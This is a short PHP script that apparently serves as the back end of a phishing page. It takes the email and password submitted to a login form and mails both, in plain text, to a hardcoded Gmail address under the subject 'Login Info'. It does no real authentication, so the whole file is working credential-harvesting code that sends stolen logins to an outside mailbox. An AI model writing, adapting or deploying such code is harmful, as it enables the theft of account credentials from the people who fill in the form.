<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Collect email and password from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Email details
    $to = "ajmirahemed5@gmail.com";  // Your email address
    $subject = "Login Info";
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "From: no-reply@yourdomain.com";

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Login information has been sent successfully.";
    } else {
        echo "Error: Could not send login information.";
    }
} else {
    // Display error if method is not POST
    http_response_code(405);
    echo "Error: Method not allowed.";
}
?>
